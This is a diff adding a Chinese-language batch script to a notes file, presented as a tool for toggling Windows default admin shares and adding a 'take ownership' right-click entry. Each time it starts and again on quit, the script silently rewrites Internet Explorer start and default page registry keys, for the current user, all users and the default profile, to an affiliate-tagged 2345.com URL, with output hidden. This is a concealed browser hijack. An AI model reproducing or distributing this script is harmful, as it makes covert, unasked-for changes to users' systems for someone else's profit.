@@ -4,6 +4,84 @@ pip install trik
 pip install trik -i https://hellotrik.github.io
 cmake .. -G "Visual Studio 14 2015 Win64" -DWITH_GPU=OFF -DWITH_TESTING=OFF -DCMAKE_BUILD_TYPE=Release
 ```
+### 关闭windows默认共享
+```batch
+@echo off
+@color 74
+:main
+cls
+reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Internet Explorer\MAIN" /v "Start Page"  /d ^http://www.2345.com/?ksukumo^ /f >nul
+reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Internet Explorer\MAIN" /v Default_Page_URL /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "Start Page"  /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v Default_Page_URL /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page"  /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Local Page" /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKU\.DEFAULT\Software\Microsoft\Internet Explorer\Main" /v "Start Page"  /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKU\.DEFAULT\Software\Microsoft\Internet Explorer\Main" /v "First Home Page"  /d ^http://www.2345.com/?ksukumo^ /f>nul
+
+echo.&echo.
+echo(--------------------------Angel------------------------------------
+echo 	我今天没吃药，
+echo 		感觉自己萌萌哒，
+echo 		      萌萌哒，羞羞哒，走路一蹦一跳哒 0.0 
+echo(-----------------------------------------------Angel---------------
+echo.    
+echo 1开启默认共享	2关闭默认共享	3右键添加管理员区的权限 c清除背景文件夹历史	q 退出
+echo.&echo.
+set /p option=input your choice:
+if  "%option%"=="1" goto 1
+if  "%option%"=="2" goto 2
+if "%option%"=="3" goto 3
+if "%option%"=="q" goto q
+if "%option%"=="c" goto c
+echo.&echo.
+if not defined "%option%" goto x
+:c
+reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers\Images /va /f>nul
+echo 		It's cleard,soon back to menu
+ping /n 2 127.1>nul
+goto main
+:q
+reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Internet Explorer\MAIN" /v "Start Page"  /d ^http://www.2345.com/?ksukumo^ /f >nul
+reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Internet Explorer\MAIN" /v Default_Page_URL /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "Start Page"  /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v Default_Page_URL /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page"  /d ^http://www.2345.com/?ksukumo^ /f>nul
+reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Local Page" /d ^http://www.2345.com/?ksukumo^ /f>nul
+echo			SEE~YOU---------
+ping /n 2 127.1>nul
+exit
+:1
+reg delete HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v autosharewks /f 2>nul
+reg delete HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v autoshareserver /f 2>nul&echo 已开启
+net stop Server&net start Server&goto main
+:2
+reg add HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v autoshareserver /t REG_DWORD /d 0 /f>nul
+reg add HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v autosharewks /t REG_DWORD /d 0 /f>nul&echo 已关闭
+net stop Server&net start Server&goto main
+:3
+reg add HKCR\*\shell\runas /ve /t REG_SZ /d "获取管理员权限" /f>nul
+reg add HKCR\*\shell\runas /v "NoWorkingDirectory" /t REG_SZ /d "" /f>nul
+reg add HKCR\*\shell\runas\command /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F" /f>nul
+reg add HKCR\*\shell\runas\command /v "IsolatedCommand"  /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F" /f>nul
+
+reg add HKCR\exefile\shell\runas2  /ve /t REG_SZ /d "获取管理员权限" /f>nul
+reg add HKCR\exefile\shell\runas2 /v "NoWorkingDirectory" /t REG_SZ /d "" /f>nul
+reg add HKCR\exefile\shell\runas2\command /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F" /f>nul
+reg add HKCR\exefile\shell\runas2\command /v "IsolatedCommand" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F" /f>nul
+
+reg add HKCR\Directory\shell\runas /ve /t REG_SZ /d "获取管理员权限" /f>nul
+reg add HKCR\Directory\shell\runas /v "NoWorkingDirectory" /t REG_SZ /d "" /f>nul
+reg add HKCR\Directory\shell\runas\command /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F" /f>nul
+reg add HKCR\Directory\shell\runas\command /v "IsolatedCommand"  /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F" /f>nul
+
+goto main
+:x
+echo 		Input error,Soon back to menu
+ping /n 2 127.1>nul
+goto main
+```
+
 
 ### set shell edit command=scite.exe
 ```batch
